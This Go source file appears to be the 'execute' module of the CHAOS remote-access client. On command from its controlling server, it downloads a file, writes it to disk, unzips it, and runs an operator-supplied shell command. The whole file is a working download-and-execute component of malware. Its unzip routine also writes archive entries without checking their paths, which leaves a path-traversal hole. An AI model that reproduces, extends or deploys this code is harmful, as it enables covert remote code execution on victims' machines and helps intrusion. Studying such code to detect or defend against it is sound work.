package execute

import (
	"archive/zip"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path"
	"path/filepath"
	"strings"

	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/gateways"
	"github.com/tiagorlampert/CHAOS/client/app/services"
)

type Service struct {
	Configuration *environment.Configuration
	Terminal      services.Terminal
	Gateway       gateways.Gateway
}

// 定义结构体
type Message struct {
	Url      string `json:"url"`
	Location string `json:"localtion"`
	Action   string `json:"action"`
}

func NewService(
	configuration *environment.Configuration,
	terminal services.Terminal,
	gateway gateways.Gateway) services.Execute {
	return &Service{
		Configuration: configuration,
		Terminal:      terminal,
		Gateway:       gateway,
	}
}

func (d Service) Run(parameter string) error {
	var message Message
	err := json.Unmarshal([]byte(parameter), &message)
	if err != nil {
		return fmt.Errorf("decode JSON error %s", err.Error())
	}

	if !strings.HasPrefix(message.Url, "http") {
		message.Url = fmt.Sprintf("%s%s", fmt.Sprint(d.Configuration.Server.Url), message.Url)
	}

	parsedURL, err := url.Parse(message.Url)
	if err != nil {
		return fmt.Errorf("Parse Url error %s", err.Error())
	}

	fileName := path.Base(parsedURL.Path)
	fullPath := fmt.Sprintf("%s%s", message.Location, fileName)

	if pathExists(fullPath) {
		os.Remove(fullPath)
	}

	res, err := d.Gateway.NewRequest(http.MethodGet, message.Url, nil)
	if err != nil {
		return fmt.Errorf("download url error %s", err.Error())
	}

	if res.StatusCode != http.StatusOK {
		return fmt.Errorf("request failed with status code: %d", res.StatusCode)
	}

	if err := os.WriteFile(fullPath, res.ResponseBody, os.ModePerm); err != nil {
		return fmt.Errorf("write fullPath error %s", err.Error())
	}

	if strings.HasSuffix(message.Url, ".zip") {
		err := unzip(fullPath, message.Location)
		if err != nil {
			return fmt.Errorf("decompress error %s", err.Error())
		}
	}

	if message.Action != "" {
		result, err := d.Terminal.Run(message.Action)
		if err != nil {
			return fmt.Errorf("action error => %s", err.Error())
		}
		return fmt.Errorf("action result => %s", result)
	}
	return nil
}

func getFilenameFromPath(path string) string {
	return filepath.Base(path)
}

func unzip(src, dest string) error {
	r, err := zip.OpenReader(src)
	if err != nil {
		return err
	}
	defer r.Close()

	for _, f := range r.File {
		fpath := filepath.Join(dest, f.Name)

		if f.FileInfo().IsDir() {
			os.MkdirAll(fpath, os.ModePerm)
		} else {
			os.MkdirAll(filepath.Dir(fpath), os.ModePerm)

			outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
			if err != nil {
				return err
			}
			defer outFile.Close()

			rc, err := f.Open()
			if err != nil {
				return err
			}
			defer rc.Close()

			_, err = io.Copy(outFile, rc)
			if err != nil {
				return err
			}
		}
	}
	return nil
}

func pathExists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return false
}
